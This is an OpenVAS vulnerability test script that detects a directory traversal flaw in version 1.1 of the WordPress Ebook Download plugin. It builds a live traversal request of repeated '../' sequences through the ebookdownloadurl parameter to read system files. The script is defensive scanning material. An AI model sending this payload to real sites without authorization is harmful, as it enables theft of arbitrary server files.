###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_wordpress_ebook_download_dir_trav_vuln.nasl 12051 2018-10-24 09:14:54Z asteins $
#
# Wordpress Ebook Download Plugin Directory Traversal Vulnerability
#
# Authors:
# Kashinath T <tkashinath@secpod.com>
#
# Copyright:
# Copyright (C) 2016 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:wordpress:wordpress";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.807624");
  script_version("$Revision: 12051 $");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_tag(name:"last_modification", value:"$Date: 2018-10-24 11:14:54 +0200 (Wed, 24 Oct 2018) $");
  script_tag(name:"creation_date", value:"2016-04-01 13:19:32 +0530 (Fri, 01 Apr 2016)");
  script_name("Wordpress Ebook Download Plugin Directory Traversal Vulnerability");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2016 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("secpod_wordpress_detect_900182.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("wordpress/installed");

  script_xref(name:"URL", value:"https://www.exploit-db.com/exploits/39575/");

  script_tag(name:"summary", value:"This host is installed with Wordpress Ebook
  Download plugin and is prone to directory traversal vulnerability.");

  script_tag(name:"vuldetect", value:"Send a crafted HTTP GET request
  and check whether it is able to read arbitrary files or not");

  script_tag(name:"insight", value:"The flaw exists due to an improper sanitization
  of input to 'ebookdownloadurl' parameter in 'filedownload.php' file.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attckers
  to read arbitrary files.");

  script_tag(name:"affected", value:"Wordpress Ebook Download plugin version
  version 1.1");

  script_tag(name:"solution", value:"Upgrade to Ebook Download plugin version
  1.2 or later.");

  script_tag(name:"qod_type", value:"exploit");
  script_tag(name:"solution_type", value:"VendorFix");

  script_xref(name:"URL", value:"https://wordpress.org/plugins/ebook-downloader/");
  exit(0);
}

include("misc_func.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if(!http_port = get_app_port(cpe:CPE)){
  exit(0);
}

if(!dir = get_app_location(cpe:CPE, port:http_port)){
  exit(0);
}

if(dir == "/") dir = "";

files = traversal_files();

foreach file (keys(files)){

   url = dir + '/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=' + crap(data:"../", length:3*15) + files[file];

   if(http_vuln_check( port:http_port, url:url, check_header:TRUE, pattern:file ) ){
     report = report_vuln_url(port:http_port, url:url);
     security_message(port:http_port, data:report);
     exit(0);
   }
}

exit(99);